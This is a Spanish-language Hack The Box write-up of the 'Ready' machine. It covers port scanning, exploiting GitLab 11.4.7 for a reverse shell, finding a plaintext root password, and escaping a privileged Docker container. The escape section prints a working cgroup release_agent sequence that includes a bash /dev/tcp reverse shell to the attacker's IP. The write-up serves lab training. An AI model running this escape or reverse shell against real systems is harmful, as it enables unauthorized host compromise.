---
title: "Ready - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "assets/images/machines/ready/data/ready.png"
  teaser_home_page: true
  icon: "assets/images/icons/Hackthebox2.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Doker
  - RCE (Remote Code Execution)
  - GitLab
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/data/readyHTB.png">
</p>

La máquina **Ready** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **medio** una puntuación de 4.2, **6646 USER OWNS** y **5768 SYSTEM OWNS** con la ip **10.10.10.220** y un sistema operativo **Linux**.

### Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.10.220]** utilizando los parámetros:
  - **-p-:**    Escaneo a toda la gama de puertos (65536).
  - **-n:**     No hacen la resolución del DNS.
  - **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
  - **-v:**     Aumenta el nivel de los mensajes verbose.
  - **--open:** Muestra sólo los puertos con un estatus abierto.
  - **-oG:**    Guarda la el output en formato Grepeable.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/scan/scanPort.png">
  </p>

  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPort**, vemos que los puertos que destacaron en este caso fueron **22,5080**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/scan/Ports.png">
  </p>

  Una vez identificados los puertos abiertos, realizaremos un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

    - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
    - **-sV:** Detección de versiones en servicios alojados en puertos.
    - **-p :** Puertos a inspeccionar.
    - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/scan/PortServ.png">
  </p>

  Lo que **nmap** nos muestra es exite un servicio ***HTTP*** en el puerto 5080 con un **robots.txt** habilitado.
  Si entramos a la pagina web vemos que es tiene como **cms** un GitLab.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/scan/page.png">
  </p>

  Ya que nos permite crear una cuenta procedo a crear la cuenta:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/scan/pageLogin.png">
  </p>


## Lateral Movement

  Ya dentro de la cuenta que acabo de crear, enumerando pude encontrar la versión de **GitLab** la cual es **11.4.7**, buscando con la herramienta de **searchsploit** la versión del CMS encontre que tiene varios exploits que nos permiten hacen un ataque de Remote Code Execution:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/version.png">
  </p>
  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/searchsploit.png">
  </p>

  Examinando el exploit con el **id 49334** ya que pide autenticación usamos ese con las credenciales que acabamos de crear, examinando el exploit se modifico unas lineas ya que tenia algunos errores, se modifico la linea **29** ya que la variable **local_port** estaba tomando el argumento de la variable **password** y a al momento de ejecutar el exploit las credenciales se enviaban mal, tambien se modifico la linea **59** que esa linea corresponde a el payload, se le agrego el argumento **-e /bin/bash** esto fue asi porque a la hora de ejecutar el exploit nos da la conexion pero no nos permite ejcutar ningun comando y a veces da un error, para asegurar la shell le agregamos estos parametros:

  <div align="center">
  <table class="center"><tr>
  <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/expModpa.png">
  <div class="caption" >Before.</div></center></td>
  <td><center><img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/expModpb.png">
  <div class="caption">After.</div></center></td>
  </tr></table>
  </div>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/expModB.png">
  </p>

Una vez que ya hice los cambios me puse por el puerto **443** en escucha con Netcat  ejecute el exploit pasado menos de 5 seg. me llego la conexion y con ella la shell:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/shell.png">
</p>

## ## Privilege escalation

Una vez que ya estoy dentro de la maquina como el usuario **git** me dirijo a la ruta **/tmp/** y creo un directorio llamado **/winsad** ahi dentro me descargo de mi maquina el binario de **linpeas.sh** con **wget** para poder hacer una enumeracion del sistema y encontrar una forma de escalar privilegios, ejecutando el binario me encontre una credencial en texto plano que pertenecia al usuario **root** dentro del archivo **/opt/backup/gitlab.rb**:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/passwd.png">
</p>

Ya que tenemos las credenciales de **root** entramos a su directorio personal y vemos que la **flag** de root no esta, lo que genera sospechas ya que podriamos estar en un **Doker**, ya que el mismo **linpeas** nos dio informacion que no puedo dar muchas pistas de esto mismo y agregar que el comando **ifconfig**, **ip -a** no estaban habilitados o disponibles en la maquina.

Una prueba que podemos ver si estamos en un **Contenedor-Doker** es haciendo un **cat** a la ruta ```/proc/1/cgroup```.

cgroups significa "grupos de control". Es una característica de Linux que aísla el uso de recursos y es lo que Docker utiliza para aislar los contenedores. Puedes saber si estás en un contenedor comprobando el grupo de control del proceso init en /proc/1/cgroup. Si no estás dentro de un contenedor, el grupo de control debería ser /. Por otro lado, si estás dentro de un contenedor, deberías ver /docker/CONTAINER_ID en su lugar.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/docker1.png">
</p>

Ya que sabemos que estamos en un **Docker** buscando en internet como escapar de un contenedor me encuentro con un articulo el cual explica el como poder escapar de estos mismo.

En el articulo explican que para poder escapar tenemos que ver si el contenedor tiene algun privilegio establecido para ver esto usamos el comando ```#ip link add dummy0 type dummy ```  esto se hace ya que este comando requiere la capacidad **NET_ADMIN**, que el contenedor tendría si tiene privilegios y si este comando se ejecuta con éxito, puede concluir que el contenedor tiene la capacidad **NET_ADMIN**.

En este caso ya que el comando **ip** esta desabilitado no podemos hacer la prueba pero en el mismo articulo nos explican como podriamos ejecutar comandos en la maquina host estando dentro del contenedor, se seguiria los siguientes comandos:

```
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/bash' > /cmd
echo " bash -i >& /dev/tcp/10.10.15.125/444 0>&1> $host_path/output" >> /cmd <-- Insertamos la revershell
chmod a+x /cmd

bash -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
Ya ejecutado estas sentencia de comando vemos que efectivamente pudimos salir del docker ejecutando comandos en la maquina host.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/ready/intrusion/root.png">
</p>


## Referencias

https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1

https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

https://www.youtube.com/watch?v=_dhONyAk4es
